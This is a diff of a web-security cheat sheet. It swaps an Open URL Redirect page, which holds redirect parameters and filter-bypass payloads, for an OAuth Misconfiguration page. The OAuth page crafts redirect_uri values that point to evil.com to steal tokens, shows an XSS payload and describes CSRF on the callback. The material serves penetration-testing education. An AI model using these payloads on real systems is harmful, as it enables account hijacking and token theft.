@@ -1,185 +1,81 @@
-# Open URL Redirect
+# OAuth Misconfiguration
 
-> Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.
+> OAuth is a widely-used authorization framework that allows third-party applications to access user data without exposing user credentials. However, improper configuration and implementation of OAuth can lead to severe security vulnerabilities. This document explores common OAuth misconfigurations, potential attack vectors, and best practices for mitigating these risks.
 
 ## Summary
 
-* [Methodology](#methodology)
-    * [HTTP Redirection Status Code](#http-redirection-status-code)
-    * [Redirect Methods](#redirect-methods)
-        * [Path-based Redirects](#path-based-redirects)
-        * [JavaScript-based Redirects](#javascript-based-redirects)
-        * [Common Query Parameters](#common-query-parameters)
-    * [Filter Bypass](#filter-bypass)
-* [Labs](#labs)
-* [References](#references)
+- [Stealing OAuth Token via referer](#stealing-oauth-token-via-referer)
+- [Grabbing OAuth Token via redirect_uri](#grabbing-oauth-token-via-redirect_uri)
+- [Executing XSS via redirect_uri](#executing-xss-via-redirect_uri)
+- [OAuth Private Key Disclosure](#oauth-private-key-disclosure)
+- [Authorization Code Rule Violation](#authorization-code-rule-violation)
+- [Cross-Site Request Forgery](#cross-site-request-forgery)
+- [Labs](#labs)
+- [References](#references)
 
-## Methodology
+## Stealing OAuth Token via referer
 
-An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.
+> Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)
 
-Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.
+## Grabbing OAuth Token via redirect_uri
 
-**Example**: A web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:
-
-```ps1
-https://example.com/redirect?url=https://userpreferredsite.com
-```
-
-An attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.
-
-## HTTP Redirection Status Code
-
-HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:
-
-* [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
-* [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
-* [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
-* [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
-* [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
-* [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource must be accessed through a proxy provided in the Location header.
-* [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
-* [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.
-
-## Redirect Methods
-
-### Path-based Redirects
-
-Instead of query parameters, redirection logic may rely on the path:
-
-* Using slashes in URLs: `https://example.com/redirect/http://malicious.com`
-* Injecting relative paths: `https://example.com/redirect/../http://malicious.com`
-
-### JavaScript-based Redirects
-
-If the application uses JavaScript for redirects, attackers may manipulate script variables:
-
-**Example**:
-
-```js
-var redirectTo = "http://trusted.com";
-window.location = redirectTo;
-```
-
-**Payload**: `?redirectTo=http://malicious.com`
-
-### Common Query Parameters
+Redirect to a controlled domain to get the access token
 
 ```powershell
-?checkout_url={payload}
-?continue={payload}
-?dest={payload}
-?destination={payload}
-?go={payload}
-?image_url={payload}
-?next={payload}
-?redir={payload}
-?redirect_uri={payload}
-?redirect_url={payload}
-?redirect={payload}
-?return_path={payload}
-?return_to={payload}
-?return={payload}
-?returnTo={payload}
-?rurl={payload}
-?target={payload}
-?url={payload}
-?view={payload}
-/{payload}
-/redirect/{payload}
+https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
+https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
 ```
 
-## Filter Bypass
+Redirect to an accepted Open URL in to get the access token
 
-* Using a whitelisted domain or keyword
+```powershell
+https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
+https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
+```
 
-    ```powershell
-    www.whitelisted.com.evil.com redirect to evil.com
-    ```
+OAuth implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open Redirect.
 
-* Using **CRLF** to bypass "javascript" blacklisted keyword
+Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:
 
-    ```powershell
-    java%0d%0ascript%0d%0a:alert(0)
-    ```
+```powershell
+https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
+```
 
-* Using "`//`" and "`////`" to bypass "http" blacklisted keyword
+## Executing XSS via redirect_uri
 
-    ```powershell
-    //google.com
-    ////google.com
-    ```
+```powershell
+https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
+```
 
-* Using "https:" to bypass "`//`" blacklisted keyword
+## OAuth Private Key Disclosure
 
-    ```powershell
-    https:google.com
-    ```
+Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.
 
-* Using "`\/\/`" to bypass "`//`" blacklisted keyword
+## Authorization Code Rule Violation
 
-    ```powershell
-    \/\/google.com/
-    /\/google.com/
-    ```
+> The client MUST NOT use the authorization code  more than once.  
 
-* Using "`%E3%80%82`" to bypass "." blacklisted character
+If an authorization code is used more than once, the authorization server MUST deny the request
+and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.
 
-    ```powershell
-    /?redir=google。com
-    //google%E3%80%82com
-    ```
+## Cross-Site Request Forgery
 
-* Using null byte "`%00`" to bypass blacklist filter
+Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). This URL can be used in CSRF attacks.
 
-    ```powershell
-    //google%00.com
-    ```
-
-* Using HTTP Parameter Pollution
-
-    ```powershell
-    ?next=whitelisted.com&next=google.com
-    ```
-
-* Using "@" character. [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)
-
-    ```powershell
-    //<user>:<password>@<host>:<port>/<url-path>
-    http://www.theirsite.com@yoursite.com/
-    ```
-
-* Creating folder as their domain
-
-    ```powershell
-    http://www.yoursite.com/http://www.theirsite.com/
-    http://www.yoursite.com/folder/www.folder.com
-    ```
-
-* Using "`?`" character, browser will translate it to "`/?`"
-
-    ```powershell
-    http://www.yoursite.com?http://www.theirsite.com/
-    http://www.yoursite.com?folder/www.folder.com
-    ```
-
-* Host/Split Unicode Normalization
-
-    ```powershell
-    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
-    http://a.com／X.b.com
-    ```
+> The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state. The client SHOULD utilize the "state" request parameter to deliver this value to the authorization server when making an authorization request.
 
 ## Labs
 
-* [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
-* [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
+- [PortSwigger - Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
+- [PortSwigger - Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
+- [PortSwigger - OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
+- [PortSwigger - Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
+- [PortSwigger - Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)
 
 ## References
 
-* [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://web.archive.org/web/20190819081715/https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
-* [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://web.archive.org/web/20190719012735/https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
-* [Open Redirect Vulnerability - s0cket7 - August 15, 2018](https://web.archive.org/web/20180816184136/https://s0cket7.com/open-redirect-vulnerability/)
-* [Open-Redirect-Payloads - Predrag Cujanović - April 24, 2017](https://github.com/cujanovic/Open-Redirect-Payloads)
-* [Unvalidated Redirects and Forwards Cheat Sheet - OWASP - February 28, 2024](https://web.archive.org/web/20130423163025/https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
-* [You do not need to run 80 reconnaissance tools to get access to user accounts - Stefano Vettorazzi (@stefanocoding) - May 16, 2019](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
+- [All your Paypal OAuth tokens belong to me - asanso - November 28, 2016](https://web.archive.org/web/20161130191804/http://blog.intothesymmetry.com:80/2016/11/all-your-paypal-tokens-belong-to-me.html)
+- [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - asanso - April 8, 2014](https://web.archive.org/web/20140411210456/http://intothesymmetry.blogspot.ch:80/2014/04/oauth-2-how-i-have-hacked-facebook.html)
+- [How I hacked Github again - Egor Homakov - February 7, 2014](https://web.archive.org/web/20140302195803/http://homakov.blogspot.ch:80/2014/02/how-i-hacked-github-again.html)
+- [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka - September 16, 2014](https://web.archive.org/web/20151221013410/http://andrisatteka.blogspot.ch:80/2014/09/how-microsoft-is-giving-your-data-to.html)
+- [Bypassing Google Authentication on Periscope's Administration Panel - Jack Whitton - July 20, 2015](https://web.archive.org/web/20250113205505/https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)
